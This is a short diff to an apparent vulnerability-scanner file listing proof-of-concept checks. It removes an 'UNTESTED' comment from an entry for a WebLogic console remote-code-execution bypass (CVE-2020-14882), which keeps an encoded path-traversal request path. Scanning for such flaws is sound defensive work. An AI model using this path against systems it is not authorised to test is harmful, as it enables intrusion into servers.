@@ -63,7 +63,6 @@ export const poc = [{
     critLevel: 3
 },
 {
-    // UNTESTED!!!
     title: "RCE: Weblogic Console (CVE-2020-14882)",
     rootPaths: [
         "/console/css/%252e%252e%252fconsole.portal"
